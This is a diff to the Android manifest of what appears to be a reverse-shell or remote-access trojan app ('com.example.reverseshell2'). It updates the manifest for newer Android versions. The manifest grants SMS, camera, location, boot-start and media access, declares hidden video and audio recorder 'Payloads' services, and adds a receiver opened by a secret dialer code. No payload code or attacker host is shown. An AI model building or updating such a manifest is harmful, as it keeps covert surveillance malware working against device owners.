@@ -1,7 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
-    package="com.example.reverseshell2">
+    xmlns:tools="http://schemas.android.com/tools">
 
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.INTERNET" />
@@ -9,15 +8,21 @@
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.CAMERA" />
-
-
-
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
     <uses-feature android:name="android.hardware.camera" />
     <uses-feature android:name="android.hardware.camera.autofocus" />
 
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission
+        android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission
+        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        android:maxSdkVersion="29"
+        tools:ignore="ScopedStorage" />
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
     <uses-permission android:name="android.permission.VIBRATE" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
@@ -35,9 +40,14 @@
         android:largeHeap="true"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
-        android:theme="@style/AppTheme">
-        <activity android:name=".controlPanel"></activity>
-        <activity android:name=".MainActivity">
+        android:theme="@style/AppTheme"
+        android:usesCleartextTraffic="true">
+        <activity
+            android:name=".controlPanel"
+            android:exported="false" />
+        <activity
+            android:name=".MainActivity"
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
@@ -48,8 +58,7 @@
         <service
             android:name=".mainService"
             android:enabled="true"
-            android:exported="false">
-        </service>
+            android:exported="false" />
 
         <receiver
             android:name=".broadcastReciever"
@@ -62,19 +71,29 @@
             </intent-filter>
         </receiver>
 
-        <receiver android:name=".keypadListner">
+        <receiver
+            android:name=".keypadListner"
+            android:exported="true">
             <intent-filter>
                 <action android:name="android.provider.Telephony.SECRET_CODE" />
-                <data android:scheme="android_secret_code" android:host="1337"/>
+
+                <data
+                    android:host="1337"
+                    android:scheme="android_secret_code" />
             </intent-filter>
         </receiver>
 
         <service
             android:name=".jobScheduler"
+            android:exported="false"
             android:permission="android.permission.BIND_JOB_SERVICE" />
 
-        <service android:name=".Payloads.videoRecorder" />
-        <service android:name=".Payloads.audioManager" />
+        <service
+            android:name=".Payloads.videoRecorder"
+            android:exported="false" />
+        <service
+            android:name=".Payloads.audioManager"
+            android:exported="false" />
     </application>
 
 </manifest>
